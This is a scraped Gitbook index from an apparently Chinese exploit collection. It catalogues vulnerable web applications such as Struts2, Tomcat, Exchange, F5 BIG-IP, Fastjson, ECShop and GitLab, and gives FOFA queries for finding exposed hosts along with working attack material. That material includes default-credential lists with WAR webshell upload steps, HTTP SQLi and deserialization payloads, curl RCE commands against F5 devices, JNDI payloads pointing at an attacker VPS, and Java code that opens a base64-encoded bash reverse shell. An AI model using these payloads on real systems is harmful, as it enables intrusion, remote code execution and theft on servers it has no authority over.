192.168.226.134 set lport 4444 set srvhost 192.168.226.134 set srvport 8080 exploit 参考链接 https://github.com/vulhub/vulhub/blob/master/spark/unacc/README.md POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Spark/RCE（CVE-2020-9480）/":{"url":"Apache-Spark/RCE（CVE-2020-9480）/","title":"RCE（CVE-2020-9480）","keywords":"","body":"漏洞概述 独立资源管理器的主服务器可能被配置为需要通过共享密钥进行身份验证(spark.authenticate)。 然而，由于Spark的认证机制存在缺陷，导致共享密钥认证失效。 攻击者利用该漏洞，可在未授权的情况下，在主机上执行命令，造成远程代码执行。 影响范围 Apache Spark POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Struts2/":{"url":"Apache-Struts2/","title":"Apache Struts 2","keywords":"","body":"应用简介 Apache Struts2 是一个基于MVC设计模式的Web应用框架，会对某些标签属性（比如 id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。 相关资产 FOFA app=\"Struts2\" 环境搭建 Docker一键搭建Vulhub 重要漏洞 S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell 漏洞利用 1、某Struts全版本检测工具 2、Railgun 3、Goby 以上工具皆可扫描利用 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Tomcat/":{"url":"Apache-Tomcat/","title":"Apache Tomcat","keywords":"","body":"应用简介 Tomcat 是当前最流行的 Java 中间件服务器之一。 官方网站：http://tomcat.apache.org 相关资产 FOFA app=\"APACHE-Tomcat\" 环境搭建 VulnRange可快速搭建此环境 弱口令Getshell 1、访问ip:8080/manager/html admin/admin admin/Admin admin/Admin@123 tomcat/tomcat tomcat/空 tomcat/123456 tomcat/654321 tomcat/000000 tomcat/111111 admin/123456 admin/654321 admin/000000 admin/111111 2、部署war包getshell #shell.jsp单独放置一个目录，命令行下进入当前目录,打包成war包 jar -cvf login.war .\\ 找到 WAR file to deploy 这一项，上传war包后应用即可 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Tomcat/AJP 文件包含漏洞（CVE-2020-1938）/":{"url":"Apache-Tomcat/AJP 文件包含漏洞（CVE-2020-1938）/","title":"AJP 文件包含漏洞（CVE-2020-1938）","keywords":"","body":"漏洞概述 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。 此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 影响范围 #影响版本 8009端口 Apache Tomcat 9.x POC Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009，用长亭的Xray检测即可 xray servicescan --target 127.0.0.1:8009 或者Goby也有此POC EXP 一个比较全的Tomcat利用工具-https://github.com/hypn0s/AJPy WAR包 上传 利用CVE-2020-1938读取文件等 参考链接 Ghostcat（幽灵猫） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apereo-CAS/":{"url":"Apereo-CAS/","title":"Apereo CAS","keywords":"","body":"应用简介 Apereo CAS是一个开源的企业级单点登录系统 Github：https://github.com/apereo/cas 一个开放且有据可查的协议 开源Java服务器组件 可插拔身份验证支持（LDAP，数据库，X.509、双因子） 支持多种协议（CAS，SAML，OAuth，OpenID） Java，.Net，PHP，Perl，Apache，uPortal等客户端的库 与uPortal，BlueSocket，TikiWiki，Mule，Liferay，Moodle等集成 社区文档和实施支持 广泛的采用者社区 相关资产 FOFA app=\"apereo-CAS\" 环境搭建 VulnRange可一键开启此环境 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apereo-CAS/Apereo CAS 4.1 反序列化命令执行漏洞/":{"url":"Apereo-CAS/Apereo CAS 4.1 反序列化命令执行漏洞/","title":"Apereo CAS 4.1 反序列化命令执行漏洞","keywords":"","body":"漏洞概述 [默认密钥]-4.1.x 反序列化RCE 其4.1.7版本之前存在一处默认密钥（changeit）的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令 影响范围 Apereo-CAS POC 1、使用Apereo-CAS-Attack利用ysoserial的CommonsCollections4生成加密后的Payload java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 \"touch /tmp/success\" 2、然后登录CAS并抓包，将Body中的execution值替换成上面生成的Payload POST /cas/login HTTP/1.1 Host: your-ip Content-Length: 2287 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://your-ip:8080 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://your-ip:8080/cas/login Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734 Connection: close username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN EXP 两个都是图形化工具 EXP1：cas_exploit-1.0-SNAPSHOT-all.jar EXP2：@nice0e3 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Cacti/":{"url":"Cacti/","title":"Cacti","keywords":"","body":"应用简介 Cacti（仙人掌）是一套基于 RRDTool 的服务器网络流量监测-图形分析工具 官方网站：https://cacti.net/ 官方文档：https://docs.cacti.net 默认账户：admin/admin 相关资产 FOFA app=\"cacti-监控系统\" ZoomEye title:\"cacti\" 环境搭建 https://www.linuxprobe.com/cacti-install-use.html POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Cacti/Cacti v1.2.8 RCE（CVE-2020-8813）/":{"url":"Cacti/Cacti v1.2.8 RCE（CVE-2020-8813）/","title":"Cacti v1.2.8 RCE（CVE-2020-8813）","keywords":"","body":"漏洞概述 漏洞点在登录的Cookie变量Cacti的值，将其改为系统命令造成RCE； 但是操作Cookie值会遇到身份验证问题，因此需开启访客页面，配合利用。 影响范围 Cacti POC 暂无。编写nuclei的poc!!! EXP Pre-Auth RCE 前提：开启来宾实时图查看权限 graph_realtime.php?action=init 中包含poller_realtime.php python Cacti-preauth-rce.py x.x.x.x ListeningIP ListeningPORT(VPS监听) Post-Auth RCE 前提：已知一个账户 python Cacti-postauth-rce.py x.x.x.x admin pass ListeningIP ListeningPORT 参考链接 https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/ POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Discuz/":{"url":"Discuz/","title":"Discuz","keywords":"","body":"应用简介 Discuz! 是一款开源论坛社区 官方网站：https://www.discuz.net 相关资产 app=\"Tencent-Discuz\" 环境搭建 下载源码-upload文件夹中的内容上传到网站目录 Discuz!X 3.4 系列漏洞梳理 https://xz.aliyun.com/t/7492 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Drupal/":{"url":"Drupal/","title":"Drupal","keywords":"","body":"应用简介 Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。 官方网站：https://www.drupal.org 中文官网：http://drupalchina.cn/index.php 相关资产 app=\"Drupal\" 环境搭建 VulnRange POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Drupal/Drupal geddon-2 RCE（CVE-2018-7600）/":{"url":"Drupal/Drupal geddon-2 RCE（CVE-2018-7600）/","title":"Drupal geddon-2 RCE（CVE-2018-7600）","keywords":"","body":"漏洞概述 Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞 影响范围 Drupal 7 POC nuclei -tags drupal -t cves/ -l urls.txt 或者Goby EXP python CVE-2018-7600.py http://target.local/ @pimps POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Drupal/Drupal 需要密码 内核RCE（CVE-2018-7602）/":{"url":"Drupal/Drupal 需要密码 内核RCE（CVE-2018-7602）/","title":"Drupal 需要密码 内核RCE（CVE-2018-7602）","keywords":"","body":"漏洞概述 Drupal是使用PHP语言编写的开源内容管理框架（CMF） 影响范围 (需要账户密码) 7.x 8.x EXP python CVE-2018-7602.py marcio2 teste123 http://127.0.0.1:9090/ @pimps POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"ECshop/":{"url":"ECshop/","title":"E Cshop","keywords":"","body":"应用简介 一个开源商城系统 官方网站：https://www.shopex.cn/products/ecshop 相关资产 FOFA app=\"ECShop\" Getshell ECShop4.1.0前台免登录SQL注入0day POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"ECshop/ECShop 2.7.3 RCE/":{"url":"ECshop/ECShop 2.7.3 RCE/","title":"ECShop 2.7.3 RCE","keywords":"","body":"漏洞概述 其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。 影响范围 ecshop 2.7.3 ecshop 3.6.0 EXP sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell), \"id\" => $id ]; $s = serialize($arr); $hash3 = '45ea207d7a2b68c49582d2d22adf953a'; $hash2 = '554fcae493e564ee0dc75bdf2ebf94ca'; echo \"POC for ECShop 2.x: \\n\"; echo \"{$hash2}ads|{$s}{$hash2}\"; echo \"\\n\\nPOC for ECShop 3.x: \\n\"; echo \"{$hash3}ads|{$s}{$hash3}\"; 生成的POC，放在Referer里发送： GET /user.php?act=login HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 @vulhub POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Exchange/":{"url":"Exchange/","title":"Exchange","keywords":"","body":"应用简介 Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。 Exchange是收费邮箱，但是国内微软并不直接出售Exchange邮箱，而是将Exchange、Lync、Sharepoint三款产品包装成Office365出售。 Exchange server还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web系统或者是其他消息系统。 相关资产 FOFA title==\"Outlook\" && country=\"CN\" body=\"\" icon_hash=\"1768726119\" ZoomEye title:\"Outlook\" 环境搭建 部署新的 Exchange 安装（微软） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Exchange/RCE-普通用户（CVE-2020-17144）/":{"url":"Exchange/RCE-普通用户（CVE-2020-17144）/","title":"RCE-普通用户（CVE-2020-17144）","keywords":"","body":"漏洞概述 漏洞是由程序未正确校验cmdlet参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。 该漏洞和 CVE-2020-0688 类似，也需要登录后才能利用，不过在利用时无需明文密码，只要具备 NTHash 即可。除了常规邮件服务与 OWA外，EWS接口也提供了利用所需的方法。漏洞的功能点本身还具备持久化功能。 影响范围 条件: 普通用户 Exchange2010 EXP https://github.com/Airboi/CVE-2020-17144-EXP 默认用法(写webshell): CVE-2020-17144-EXP.exe mail.example.com user pass 执行命令 & 端口复用: 修改ExploitClass.cs webshell请自行在exp中修改编译 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Exchange/RCE-需要域用户（CVE-2020-0688）/":{"url":"Exchange/RCE-需要域用户（CVE-2020-0688）/","title":"RCE-需要域用户（CVE-2020-0688）","keywords":"","body":"漏洞概述 由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的 影响范围 #需要域用户登陆 2010、2013、2016、2019 对于如何识别版本可以用如下的方式： 在登录界面查看网页源代码，15.1.225就是版本，之后在Mircosoft网站上根据版本号就可以直接查询 找到 EXP python CVE-2020-0688.py -s https://ip/owa/ -u user -p pass -c \"ping test.ph4nxq.dnslog.cn\" @Ridter POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Exchange/SSRF to RCE（CVE-2021-26855）/":{"url":"Exchange/SSRF to RCE（CVE-2021-26855）/","title":"SSRF to RCE（CVE-2021-26855）","keywords":"","body":"漏洞概述 2021年03月03日微软官方披露多个Exchange高危漏洞： CVE-2021-26855 Exchange服务器端请求伪造漏洞。利用此漏洞的攻击者能够以Exchange Server发送HTTP请求，扫描内网，获取Exchange用户信息。 CVE-2021-26857 Exchange反序列化漏洞。该漏洞需要管理员权限，攻击者通过构造恶意请求，触发反序列化漏洞，在服务器上执行恶意代码。 CVE-2021-26858/CVE-2021-27065 Exchange中身份验证后的任意文件写入漏洞。攻击者可以通过CVE-2021-26855的ssrf漏洞获取到的Exchange administrator凭证，构造恶意请求，在系统上写入任意文件。 影响范围 Exchange 2013 Versions POC nuclei -tags exchange -t cves/ -l urls.txt EXP python exchange-rce-exp.py @PeiQi0 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"F5-BIG-IP/":{"url":"F5-BIG-IP/","title":"F 5 BIG IP","keywords":"","body":"应用简介 F5-BIGIP链路控制器用于最大限度提升链路性能与可用性的下一代广域网链路流量管理（负载均衡） 相关资产 FOFA app=\"f5-BIGIP\" POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"F5-BIG-IP/BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）/":{"url":"F5-BIG-IP/BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）/","title":"BIG-IP-IQ 远程代码执行（CVE-2021-22986 ）","keywords":"","body":"BIG-IP： BIG-IP： 16.0.0-16.0.1 15.1.0-15.1.2 14.1.0-14.1.3.1 13.1.0-13.1.3.5 12.1.0-12.1.5.2 BIG-IQ： 7.1.0-7.1.0.2 7.0.0-7.0.0.1 6.0.0-6.1.0 POC nuclei -tags bigip -t cves/ -l urls.txt EXP poc1: curl -su admin: -H \"Content-Type: application/json\" http://[victimIP]/mgmt/tm/util/bash -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' EXP2: curl -ks https://[victimIP]/mgmt/shared/authn/login -d '{\"bigipAuthCookie\":\"\",\"loginReference\":{\"link\":\"http://localhost/mgmt/tm/access/bundle-install-tasks\"},\"filePath\":\"`id`\"}' EXP3: curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d '{\"filePath\":\"id\"}' @wugeej POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"F5-BIG-IP/TMUI 远程代码执行漏洞（CVE-2020-5902）/":{"url":"F5-BIG-IP/TMUI 远程代码执行漏洞（CVE-2020-5902）/","title":"TMUI 远程代码执行漏洞（CVE-2020-5902）","keywords":"","body":"漏洞概述 认证绕过导致远程代码执行漏洞 攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码 影响范围 BIG-IP 15.1.0 BIG-IP 14.1.0~14.1.2 BIG-IP 13.1.0~13.1.3 BIG-IP 12.1.0~12.1.5 BIG-IP 11.6.1~11.6.5 POC nuclei -tags bigip -t cves/ -l urls.txt Goby EXP 文件读取 curl -v -k \"https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf\" RCE curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin' Bypass ..; ==> /hsqldb; ..; ==> /hsqldb%0a reverse shell: ./CVE-2020-5902.sh @Budi Khoirudin @jas502n POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"FastAdmin/":{"url":"FastAdmin/","title":"Fast Admin","keywords":"","body":"应用简介 基于ThinkPHP和Bootstrap的极速后台开发框架 官方网站：https://www.fastadmin.net 官方文档：https://doc.fastadmin.net 相关资产 FOFA app=\"FASTADMIN-框架\" || body=\"\\\"uploadurl\\\":\\\"ajax\\/upload\\\"\" || body=\"api.fastadmin.net\" || body=\"\\\"fastadmin\\\":{\\\"usercenter\\\":true\" || body=\"content=\\\"FastAdmin\\\"\" || body=\"cdnurl\\\":\\\"\\\",\\\"version\"|| icon_hash=\"-1036943727\" 环境搭建 https://doc.fastadmin.net/doc/install.html Docker环境 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"FastAdmin/FastAdmin 用户权限RCE/":{"url":"FastAdmin/FastAdmin 用户权限RCE/","title":"FastAdmin 用户权限RCE","keywords":"","body":"影响范围 前提： 1、普通用户权限 2、需要修改默认配置才能使用分片上传功能，设置application/extra/upload.php下的chunking项为true EXP Usage: python fastadmin.py url 默认Webshell密码为hhh @赛博回忆录 @exp1orer POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Fastjson/":{"url":"Fastjson/","title":"Fastjson","keywords":"","body":"应用简介 Fastjson是阿里巴巴公司开源的一款JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。 它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。 相关资产 FOFA app=\"Fastjson\" 识别方法 如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显 curl http://192.168.2.133:32768/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"mx2guq.dnslog.cn\"}:0' #payload {\"a\":\" {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0 #匹配特征 http.code=500 && \"Internal Server Error\" in body 还可以通过DNS回显的方式检测后端是否使用Fastjson curl http://x.x.x.x:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' 1.2.67版本前 {\"zeo\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"}} 1.2.67版本后payload {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} 环境搭建 https://www.runoob.com/w3cnote/fastjson-intro.html https://www.cnblogs.com/hei-zi/p/13274272.html 不出网利用 @flashine {fastjson 不出网利用总结} POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Fastjson/Fastjson 1.2.24 反序列化RCE/":{"url":"Fastjson/Fastjson 1.2.24 反序列化RCE/","title":"Fastjson 1.2.24 反序列化RCE","keywords":"","body":"漏洞概述 Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞 Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链 影响范围 Fastjson POC 1、编译POC 将代码编写为class类文件，并将生成的类文件放在web目录下，启动web服务 //POC.java import java.lang.Runtime; import java.lang.Process; public class POC { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"ping\", \"bnntoh.dnslog.cn\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } } #编译 javac POC.java #启动web服务 python3 -m http.server 8001 2、配置RMI环境 用marshalsec项目，启动一个RMI服务器，监听9999端口，并加载远程类 下载地址：https://github.com/mbechler/marshalsec 切换到marshalsec目录下使用maven进行打包， mvn clean package -DskipTests 开启监听 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://VPS-IP:8001/#POC\" 9999 备注：http://xx.xx.xx.xx:9999/#POC 是放Java类的地址，类只要写名字即可，不需要加.class，其次类名前要加# 3、发送Payload POST / HTTP/1.1 Host: 192.168.2.133:32768 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 167 { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://VPS-IP:9999/POC\", \"autoCommit\":true } } EXP 使用相对简单的自动化工具 对于JNDI注入POC，会使用到RmiServer或者LdapServer（在Jndi注入中Ldap比Rmi的条件限制少） @welk1n（JNDI-Injection-Exploit） 需要VPS放行端口，此工具会自动打开监听端口 1、自动开启RMI和LDAP服务以及发布Exploit类 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"要执行的命令\" -A \"VPS-IP\" 2、Burp发送Payload（即POC中的第三步） POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Fastjson/Fastjson 1.2.47 反序列化RCE/":{"url":"Fastjson/Fastjson 1.2.47 反序列化RCE/","title":"Fastjson 1.2.47 反序列化RCE","keywords":"","body":"漏洞概述 Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。 heckAutoType黑名单中可绕过 影响范围 Fastjson 漏洞利用 1、启动LDAP服务 @welk1n（JNDI-Injection-Exploit） 需要VPS放行端口，此工具会自动打开监听端口 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"要执行的命令\" -A \"VPS-IP\" 2、生成Payload（可跳过，直接用payload） @c0ny1（FastjsonExploit） 一键生成个版本Payload，并启动利用环境 这个启动不了环境会报错，所一用上边的方法启动环境，这里的执行命令随便写，不影响结果 #编译 mvn clean package -DskipTests java -jar FastjsonExploit-0.1-beta2-all.jar JdbcRowSetImpl5 ldap://110.x.x.4:1389/qlwkdn \"cmd:ls\" 生成的payload {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1x.x.x.x:1389/qlwkdn\",\"autoCommit\":true}}} 3、Burp发送payload POST / HTTP/1.1 Host: 192.168.2.133:32770 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 203 {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1x.x.x.x:1389/qlwkdn\",\"autoCommit\":true}}} 参考链接 Fastjson反序列化漏洞的检测和利用 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Fastjson/Fastjson 1.2.68 反序列化RCE/":{"url":"Fastjson/Fastjson 1.2.68 反序列化RCE/","title":"Fastjson 1.2.68 反序列化RCE","keywords":"","body":"漏洞概述 在Fastjson 影响范围 Fastjson爆出的绕过方法可以通杀 1.2.68 以下所有版本 Fastjson POC 任意文件写入POC {\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar\",\"append\":false},\"infl\":{\"input\":\"xxx\"},\"bufLen\":1048576},\"protocolVersion\":1}} {\"x\":{\"@type\":\"java.nio.charset.Charset\",\"val\":\"500\"}} JDBC反序列化POC {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"172.20.64.40\",\"portToConnectTo\":3306,\"url\":\"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"databaseToConnectTo\":\"test\",\"info\":{\"@type\":\"java.util.Properties\",\"PORT\":\"3306\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"user\":\"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn\",\"PORT.1\":\"3306\",\"HOST.1\":\"172.20.64.40\",\"NUM_HOSTS\":\"1\",\"HOST\":\"172.20.64.40\",\"DBNAME\":\"test\"}} 漏洞利用 1、编译POC 将代码编写为class类文件，并将生成的类文件放在web目录下，启动web服务 public class exec{ public static void main(String[] args) throws Exception { Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAveC54LngueC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}\").waitFor(); } } //base64 是要执行的命令 #编译 javac POC.java python3 -m http.server 8001 2、配置RMI环境 用marshalsec项目，启动一个RMI服务器，监听9999端口，并加载远程类 下载地址：https://github.com/mbechler/marshalsec 安装maven yum install -y maven 切换到marshalsec目录下使用maven进行打包， mvn clean package -DskipTests 3、开启监听 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x:9999/#POC 备注：http://xx.xx.xx.xx:9999/#POC 是放Java类的地址，类只要写名字即可，不需要加.class，其次类名前要加# 4、反弹shell 把网站json数据包替换，然后发包，VPS即可收到 {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap:// http://xx.xx.xx.xx:9999/#POC \",\"autoCommit\":true}}} POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Gitlab/":{"url":"Gitlab/","title":"Gitlab","keywords":"","body":"应用简介 GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。 GitLab是由GitLabInc.开发，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能 相关资产 FOFA app=\"GitLab\" 环境搭建 Docker https://github.com/lyy289065406/CVE-2021-22192 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Gitlab/Gitlab 任意文件读取-鸡肋（CVE-2020-10977）/":{"url":"Gitlab/Gitlab 任意文件读取-鸡肋（CVE-2020-10977）/","title":"Gitlab 任意文件读取-鸡肋（CVE-2020-10977）","keywords":"","body":"影响范围 GitLab EE >=8.5，=8.5， EXP https://github.com/thewhiteh4t/cve-2020-10977 需要登录 修复建议 1、检查版本 cat /opt/gitlab/embedded/service/gitlab-rails/VERSION 2、下载最新版本 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Gitlab/Gitlab 未授权RCE（CVE-2021-22192）/":{"url":"Gitlab/Gitlab 未授权RCE（CVE-2021-22192）/","title":"Gitlab 未授权RCE（CVE-2021-22192）","keywords":"","body":"漏洞概述 GitLab all versions starting from 13.2 存在安全漏洞，该漏洞允许未经授权的经过身份验证的用户在服务器上执行任意代码。 影响范围 Gitlab CE/EE 13.2.0~13.7.9 13.8.0~13.8.6 13.9.0~13.9.4 漏洞利用 @lyy289065406 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Gitlab/GitLab 邮箱信息泄露漏洞（CVE-2020-26413）/":{"url":"Gitlab/GitLab 邮箱信息泄露漏洞（CVE-2020-26413）/","title":"GitLab 邮箱信息泄露漏洞（CVE-2020-26413）","keywords":"","body":"漏洞概述 GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名 影响范围 GitLab 13.4 - 13.6.2 POC Goby （需要将PeiQi文库的Goby-POC放上去） EXP python CVE-2020-26413.py @PeiQi POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Harbor/":{"url":"Harbor/","title":"Harbor","keywords":"","body":"应用简介 开源的企业级的Docker Registry管理项目，包括权限管理(RBAC)、LDAP、日志审核、管理界面、自我注册、镜像复制和中文支持等功能。Docker镜像仓库。 Git源码仓库：https://github.com/goharbor/harbor 相关资产 FOFA app=\"HARBOR\" 环境搭建 Harbor安装与基本配置 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 